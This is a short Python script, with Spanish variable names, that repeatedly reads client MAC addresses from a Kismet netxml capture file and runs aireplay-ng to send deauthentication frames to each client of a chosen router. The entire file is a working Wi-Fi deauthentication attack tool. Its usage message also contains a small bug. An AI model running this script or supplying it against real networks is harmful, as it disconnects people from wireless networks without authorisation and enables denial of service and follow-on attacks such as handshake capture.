#!/usr/bin/env python3
import re
from subprocess import call
from sys import argv
from sys import exit

if len(argv) != 3:
    print(argv[1] + " \"BSSID_router\" \"XXXX-XX.kismet.netxml\"")
    exit(0)


nothing, macRouter, archivo = argv
archivo += ".kismet.netxml"

while True:
    fd = open(archivo, 'r')
    resultado = re.findall("(\w)(\w):(\w)(\w):(\w)(\w):(\w)(\w):(\w)(\w):(\w)(\w)", fd.read())
    fd.close()
    mac = list()
    for i in range(0, len(resultado)):
        string = ""
        contador = 0
        j = 0
        while j != 12:
            if contador != 2:
                string += resultado[i][j]
                contador += 1
                j += 1
            else:
                string += ":"
                contador = 0
        mac.append(string)

    for x in range(0, len(mac)):
        if mac[x] != macRouter:
            call(["aireplay-ng", "-0", "4", "-a", macRouter, "-c", mac[x], "wlan0mon"]) # Edit wlan0mon if the monitor is named different
